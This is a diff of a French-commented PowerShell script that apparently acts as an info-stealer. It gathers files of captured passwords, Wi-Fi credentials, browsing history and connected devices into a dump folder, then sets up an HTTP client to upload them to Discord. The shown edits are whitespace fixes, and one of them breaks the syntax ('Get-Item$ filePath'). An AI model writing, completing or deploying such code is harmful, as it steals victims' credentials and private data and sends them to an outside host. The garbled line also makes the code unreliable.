@@ -65,7 +65,7 @@ Start-Sleep -Seconds 2
 # Vérification et sécurisation des fichiers générés
 foreach ($file in @("passwords.txt", "wifi.txt", "history.txt", "connected_devices.txt")) {
     $filePath = "$basePath\$file"
-    if (!(Test-Path $filePath) -or ((Get-Item$filePath).Length -eq 0)) {
+    if (!(Test-Path $filePath) -or ((Get-Item$ filePath).Length -eq 0)) {
         Set-Content -Path $filePath -Value "No data captured"
     }
     Move-Item $filePath -Destination "$dumpFolder" -Force
@@ -79,7 +79,7 @@ if (!(Test-Path $dumpFile)) { exit 1 }
 Write-Host "[*] Envoi sur Discord..." -ForegroundColor Yellow
 if (-not ("System.Net.Http.HttpClient" -as [type])) {
     $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
-    if ($httpPath) { Add-Type -Path$httpPath } else { exit 1 }
+    if ($httpPath) { Add-Type -Path $httpPath } else { exit 1 }
 }
 
 $client = New-Object System.Net.Http.HttpClient
